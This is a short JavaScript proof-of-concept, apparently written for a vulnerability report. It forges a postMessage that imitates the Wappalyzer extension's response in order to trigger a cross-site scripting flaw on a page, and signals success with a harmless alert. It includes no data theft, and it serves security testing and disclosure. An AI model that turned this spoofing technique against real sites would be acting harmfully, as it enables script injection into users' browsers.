// poc-postmessage.js — SAFE proof: emulate Wappalyzer response
(function () {
  // Build a minimal "js" array similar to what Wappalyzer posts
  const fakeWappalyzerResponse = {
    wappalyzer: {
      js: [
        // name & value fields are what the page likely inspects.
        // Adjust name/chain/value if you need to reproduce an exact code path.
        { name: 'Wappalyzer-Emu', chain: 'navigator.userAgent', value: navigator.userAgent }
      ]
    }
  };

  // Deliver the message to the page as if the extension posted it.
  // Using targetOrigin '*' is fine here for a PoC controlled by you.
  window.postMessage(fakeWappalyzerResponse, '*');

  // Optional visible proof that the PoC ran on the page:
  // (A harmless alert — do not include cookies/exfiltration.)
  setTimeout(() => alert('XSS PoC: emulated extension response delivered'), 50);
})();
